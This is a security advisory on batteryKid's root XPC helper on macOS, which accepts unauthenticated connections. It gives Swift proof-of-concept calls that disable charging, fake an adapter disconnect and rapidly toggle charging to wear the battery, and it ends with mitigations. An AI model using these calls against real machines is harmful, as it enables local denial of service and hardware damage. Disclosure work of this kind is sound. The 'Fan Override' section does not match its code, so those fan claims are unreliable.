## Summary

batteryKid for macOS registers a root-privileged XPC helper (`me.alaneuler.batteryKid.PrivilegeHelper`) that exposes unauthenticated methods to read and write SMC (System Management Controller) keys. Any local user can connect to this helper and perform privileged hardware operations, such as disabling charging or disconnecting the power adapter, without any authorization checks. This can lead to denial of service, degraded hardware performance, and potential battery wear.


## Technical Details

The vulnerable implementation is located in:
- [PrivilegeHelper.swift](https://github.com/alaneuler/batteryKid/blob/79af27c5e62b00dc5a09ddf5dadf61f38100f131/PrivilegeHelper/PrivilegeHelper.swift)
- [SMC.swift](https://github.com/alaneuler/batteryKid/blob/79af27c5e62b00dc5a09ddf5dadf61f38100f131/PrivilegeHelper/SMC.swift)

The privileged helper runs as root and registers a Mach service (`me.alaneuler.batteryKid.PrivilegeHelper`) using NSXPCListener. It then unconditionally accepts all incoming connections:

```swift
  func listener(
    _: NSXPCListener,
    shouldAcceptNewConnection newConnection: NSXPCConnection
  ) -> Bool {
    newConnection.exportedInterface = NSXPCInterface(with: HelperProtocol.self)
    newConnection
      .remoteObjectInterface = NSXPCInterface(with: RemoteApplicationProtocol
        .self)
    newConnection.exportedObject = self
    newConnection.resume()
    return true
  }
```

No validation (such as auditToken or code signing) is performed. 

The helper then exposes functions like:

```
func disableCharging(completion: @escaping (Int) -> Void)
func enableCharging(completion: @escaping (Int) -> Void)
func disablePowerAdapter(completion: @escaping (Int) -> Void)
func enablePowerAdapter(completion: @escaping (Int) -> Void)
```

This writes directly to low-level SMC keys such as:

- `CH0B`: battery charging state (0 = charging, 2 = not charging)
- `CH0I`: AC adapter presence (0 = present, 1 = disconnected)
- `F0Mn`: fan minimum RPM (setting to 0 disables fan)
- `F0Mx`: fan max speed (setting too high stresses fans)

There is no authentication, no sandboxing, and no validation of the calling client. Any local process can connect to the MachService and issue dangerous SMC writes via exposed methods.

## Proof-of-Concepts

You can interact with the XPC service from any unprivileged local process using `pc_connection_create_mach_service()` or `NSXPCConnection`, as long as the Mach service is registered.

#### Fan Override (Force 0 RPM Fan)

>This script sets the minimum fan speed to 0, causing overheating risks.

```swift
import Foundation
import BatteryKidXPC  // assumes the helper client interface is accessible

let connection = NSXPCConnection(machServiceName: "me.alaneuler.batteryKid.PrivilegeHelper", options: [])
connection.remoteObjectInterface = NSXPCInterface(with: HelperProtocol.self)
connection.resume()

let helper = connection.remoteObjectProxyWithErrorHandler { error in
    print("XPC Error: \(error)")
} as? HelperProtocol

helper?.disableCharging { result in
    print("disableCharging returned: \(result)")
}

sleep(1)

helper?.enablePowerAdapter { result in
    print("enablePowerAdapter returned: \(result)")
}

sleep(1)

helper?.disablePowerAdapter { result in
    print("disablePowerAdapter returned: \(result)")
}
```

You could expand this by modifying the helper to expose an XPC method like `setFanMinRPM(value: Int)` which internally writes to SMC key `F0Mn`.

#### Proof-of-Concept disable battery charging

>This PoC alternates SMC register CH0B rapidly to damage charging behavior.

```swift
for _ in 0..<100 {
    helper?.disableCharging { _ in }
    usleep(50000) // 50ms
    helper?.enableCharging { _ in }
    usleep(50000)
}
```

Over time, this could degrade the battery and confuse firmware logic, especially on older Macs where SMC state is more fragile.

#### Fake Power Adapter Disconnect

>This makes the system believe the AC adapter is unplugged, even if it’s not.
```swift
helper?.disablePowerAdapter { result in
    print("System now believes it's on battery power.")
}
```

## Impact

A local, unprivileged attacker can:

- Disable battery charging
- Disconnect the power adapter virtually
- Potentially damage battery health or trigger thermal throttling
- Cause denial of service on laptops (by draining battery)

This breaks macOS’s security boundary between user and system-level operations.

## Mitigation

**Recommended fixes:**

1. Enforce connection validation
Use auditToken in shouldAcceptNewConnection() to restrict access to trusted, signed client apps.

2. Restrict exposed methods
Only expose a minimal, readonly subset of functions to non-privileged clients (if any at all).

3. Add authentication logic
Consider a signed message protocol or authentication handshake before accepting requests.

4. Use SMJobBless properly
Only allow elevated operations after proper user consent and authorization.
